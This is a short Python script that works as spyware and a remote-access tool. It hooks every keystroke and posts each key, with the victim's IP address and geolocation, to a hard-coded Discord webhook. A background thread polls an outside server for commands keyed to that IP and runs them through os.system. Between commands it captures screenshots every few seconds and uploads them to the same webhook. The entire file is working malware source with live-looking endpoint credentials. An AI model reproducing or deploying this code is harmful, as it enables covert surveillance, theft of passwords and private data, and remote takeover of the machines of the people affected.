import keyboard
import pyautogui
from discord_webhook import DiscordWebhook, DiscordEmbed
import geocoder
from io import BytesIO
import time
import threading
import requests
import os
import urllib.parse

g = geocoder.ip("me")
ip = g.ip
location = str(g.latlng)
last = ""

def key_event(event):
    webhook = DiscordWebhook("https://discord.com/api/webhooks/1395407279053996102/fPiK_IDFiUCaa3AJ5O9kuqdDN-coPSbm2RvNPnOJ7SdDrJ7EKK1K6hB5awdSgmJTuFUo")
    embed = DiscordEmbed(title="Key Down", color="5cb85c")
    embed.add_embed_field(name="Key", value=event.name)
    embed.add_embed_field(name="IP", value=ip)
    embed.add_embed_field(name="Location", value=location)
    webhook.add_embed(embed=embed)

    webhook.execute()

    time.sleep(2)

def ss():
    global last
    while True:
        try:
            response = requests.get(f"https://rctcw-midway-logger.vercel.app/receive?ip={ip}", timeout=10)
            response.raise_for_status()
            data = response.json().get("req", "").strip()

            if data and data != last:
                decoded = urllib.parse.unquote(data).strip()
                os.system(decoded)
                last = data
            else:
                screenshot = pyautogui.screenshot()
                bytes_io = BytesIO()
                screenshot.save(bytes_io, format='PNG')
                bytes_io.seek(0)

                webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1395407279053996102/fPiK_IDFiUCaa3AJ5O9kuqdDN-coPSbm2RvNPnOJ7SdDrJ7EKK1K6hB5awdSgmJTuFUo", content=f"Screenshot | IP: {ip} | Location: {location}")
                webhook.add_file(file=bytes_io.getvalue(), filename='screenshot.png')
                webhook.execute()

                time.sleep(5)
        except:
            time.sleep(5)

threading.Thread(target=ss, daemon=True).start()

keyboard.on_press(key_event)

keyboard.wait()

